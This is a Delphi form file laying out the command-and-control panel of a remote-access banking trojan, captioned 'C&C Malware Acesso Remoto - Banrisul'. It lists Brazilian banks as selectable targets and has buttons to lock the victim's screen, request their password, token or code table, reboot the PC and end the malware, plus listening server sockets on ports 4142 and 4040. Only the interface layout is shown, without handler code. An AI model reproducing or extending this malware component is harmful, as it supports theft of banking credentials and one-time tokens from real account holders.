object Form1: TForm1
  Left = 0
  Top = 0
  BorderStyle = bsSingle
  Caption = 'C&C Malware Acesso Remoto - Banrisul'
  ClientHeight = 750
  ClientWidth = 1301
  Color = clBtnFace
  Font.Charset = DEFAULT_CHARSET
  Font.Color = clWindowText
  Font.Height = -11
  Font.Name = 'Tahoma'
  Font.Style = []
  OldCreateOrder = False
  Position = poScreenCenter
  WindowState = wsMaximized
  OnCreate = FormCreate
  PixelsPerInch = 96
  TextHeight = 13
  object Image1: TImage
    Left = 200
    Top = 8
    Width = 1092
    Height = 661
    AutoSize = True
    OnClick = Image1Click
    OnDblClick = Image1DblClick
    OnMouseDown = Image1MouseDown
  end
  object Label1: TLabel
    Left = 8
    Top = 37
    Width = 30
    Height = 13
    Caption = 'status'
  end
  object Label2: TLabel
    Left = 8
    Top = 661
    Width = 76
    Height = 13
    Caption = 'Texto recebido:'
  end
  object Label3: TLabel
    Left = 98
    Top = 632
    Width = 31
    Height = 13
    Caption = 'Label3'
  end
  object Label4: TLabel
    Left = 98
    Top = 659
    Width = 31
    Height = 13
    Caption = 'Label4'
  end
  object Button1: TButton
    Left = 8
    Top = 8
    Width = 75
    Height = 25
    Caption = 'Ativar'
    TabOrder = 0
    OnClick = Button1Click
  end
  object Button2: TButton
    Left = 89
    Top = 8
    Width = 75
    Height = 25
    Caption = 'Desativar'
    TabOrder = 1
    OnClick = Button2Click
  end
  object RadioGroup1: TRadioGroup
    Left = 8
    Top = 56
    Width = 177
    Height = 305
    Caption = 'Sele'#231#227'o do alvo'
    TabOrder = 2
  end
  object RadioButton1: TRadioButton
    Left = 16
    Top = 80
    Width = 113
    Height = 17
    Caption = 'Banco do Brasil'
    TabOrder = 3
    OnClick = RadioButton1Click
  end
  object RadioButton2: TRadioButton
    Left = 16
    Top = 103
    Width = 113
    Height = 17
    Caption = 'HSBC'
    TabOrder = 4
    OnClick = RadioButton2Click
  end
  object RadioButton3: TRadioButton
    Left = 16
    Top = 126
    Width = 113
    Height = 17
    Caption = 'Ita'#250
    TabOrder = 5
    OnClick = RadioButton3Click
  end
  object RadioButton4: TRadioButton
    Left = 16
    Top = 149
    Width = 113
    Height = 17
    Caption = 'Bradesco'
    TabOrder = 6
    OnClick = RadioButton4Click
  end
  object RadioButton5: TRadioButton
    Left = 16
    Top = 172
    Width = 113
    Height = 17
    Caption = 'Banrisul'
    TabOrder = 7
    OnClick = RadioButton5Click
  end
  object RadioButton6: TRadioButton
    Left = 16
    Top = 195
    Width = 113
    Height = 17
    Caption = 'Santander'
    TabOrder = 8
    OnClick = RadioButton6Click
  end
  object RadioButton7: TRadioButton
    Left = 16
    Top = 218
    Width = 113
    Height = 17
    Caption = 'Sicoob'
    TabOrder = 9
    OnClick = RadioButton7Click
  end
  object RadioButton8: TRadioButton
    Left = 16
    Top = 241
    Width = 113
    Height = 17
    Caption = 'Sicredi'
    TabOrder = 10
    OnClick = RadioButton8Click
  end
  object RadioButton9: TRadioButton
    Left = 16
    Top = 264
    Width = 113
    Height = 17
    Caption = 'Caixa E. Federal'
    TabOrder = 11
    OnClick = RadioButton9Click
  end
  object RadioButton10: TRadioButton
    Left = 16
    Top = 287
    Width = 113
    Height = 17
    Caption = 'BRB'
    TabOrder = 12
    OnClick = RadioButton10Click
  end
  object RadioButton11: TRadioButton
    Left = 16
    Top = 310
    Width = 113
    Height = 17
    Caption = 'Citibank'
    TabOrder = 13
    OnClick = RadioButton11Click
  end
  object RadioButton12: TRadioButton
    Left = 16
    Top = 333
    Width = 113
    Height = 17
    Caption = 'Serasa'
    TabOrder = 14
    OnClick = RadioButton12Click
  end
  object RadioGroup2: TRadioGroup
    Left = 8
    Top = 367
    Width = 177
    Height = 166
    Caption = 'A'#231#227'o'
    TabOrder = 15
  end
  object Button3: TButton
    Left = 16
    Top = 384
    Width = 75
    Height = 25
    Caption = 'Travar tela'
    TabOrder = 16
    OnClick = Button3Click
  end
  object Button4: TButton
    Left = 97
    Top = 384
    Width = 75
    Height = 25
    Caption = 'Destravar tela'
    TabOrder = 17
    OnClick = Button4Click
  end
  object Button5: TButton
    Left = 16
    Top = 411
    Width = 75
    Height = 25
    Caption = 'Solicitar senha'
    TabOrder = 18
    OnClick = Button5Click
  end
  object Button6: TButton
    Left = 97
    Top = 411
    Width = 75
    Height = 25
    Caption = 'Solicitar token'
    TabOrder = 19
    OnClick = Button6Click
  end
  object Button7: TButton
    Left = 16
    Top = 493
    Width = 75
    Height = 25
    Caption = 'Desconectar'
    TabOrder = 20
    OnClick = Button7Click
  end
  object Button8: TButton
    Left = 97
    Top = 438
    Width = 75
    Height = 25
    Caption = 'Reiniciar PC'
    TabOrder = 21
    OnClick = Button8Click
  end
  object Button9: TButton
    Left = 97
    Top = 493
    Width = 75
    Height = 25
    Caption = 'finalizar malw.'
    TabOrder = 22
    OnClick = Button9Click
  end
  object Button10: TButton
    Left = 16
    Top = 438
    Width = 75
    Height = 25
    Caption = 'Pedir tabela'
    TabOrder = 23
    OnClick = Button10Click
  end
  object ProgressBar1: TProgressBar
    Left = 200
    Top = 675
    Width = 1092
    Height = 16
    TabOrder = 24
  end
  object Edit1: TEdit
    Left = 8
    Top = 539
    Width = 177
    Height = 21
    TabOrder = 25
    Text = 'texto'
    OnClick = Edit1Click
  end
  object Cifrar: TButton
    Left = 8
    Top = 566
    Width = 75
    Height = 25
    Caption = 'Cifrar'
    TabOrder = 26
    OnClick = CifrarClick
  end
  object Decifrar: TButton
    Left = 110
    Top = 566
    Width = 75
    Height = 25
    Caption = 'Decifrar'
    TabOrder = 27
    OnClick = DecifrarClick
  end
  object Edit3: TEdit
    Left = 8
    Top = 597
    Width = 177
    Height = 21
    TabOrder = 28
  end
  object Button11: TButton
    Left = 8
    Top = 624
    Width = 75
    Height = 25
    Caption = 'Enviar texto'
    TabOrder = 29
    OnClick = Button11Click
  end
  object Edit4: TEdit
    Left = 8
    Top = 678
    Width = 186
    Height = 21
    TabOrder = 30
  end
  object Button12: TButton
    Left = 129
    Top = 624
    Width = 25
    Height = 25
    Caption = '+'
    TabOrder = 31
    OnClick = Button12Click
  end
  object Button13: TButton
    Left = 160
    Top = 624
    Width = 25
    Height = 25
    Caption = '-'
    TabOrder = 32
    OnClick = Button13Click
  end
  object Button14: TButton
    Left = 129
    Top = 651
    Width = 25
    Height = 25
    Caption = '+'
    TabOrder = 33
    OnClick = Button14Click
  end
  object Button15: TButton
    Left = 160
    Top = 651
    Width = 25
    Height = 25
    Caption = '-'
    TabOrder = 34
    OnClick = Button15Click
  end
  object Button16: TButton
    Left = 16
    Top = 465
    Width = 75
    Height = 25
    Caption = 'Outros 1'
    TabOrder = 35
    OnClick = Button16Click
  end
  object Button17: TButton
    Left = 97
    Top = 465
    Width = 75
    Height = 25
    Caption = 'Outros 2'
    TabOrder = 36
    OnClick = Button17Click
  end
  object s1: TServerSocket
    Active = False
    Port = 4142
    ServerType = stNonBlocking
    OnClientConnect = s1ClientConnect
    OnClientDisconnect = s1ClientDisconnect
    OnClientRead = s1ClientRead
    Left = 16
    Top = 40
  end
  object s2: TServerSocket
    Active = False
    Port = 4040
    ServerType = stNonBlocking
    OnClientConnect = s2ClientConnect
    OnClientDisconnect = s2ClientDisconnect
    OnClientRead = s2ClientRead
    Left = 56
    Top = 40
  end
  object Timer1: TTimer
    Enabled = False
    Interval = 2000
    OnTimer = Timer1Timer
    Left = 168
    Top = 344
  end
end
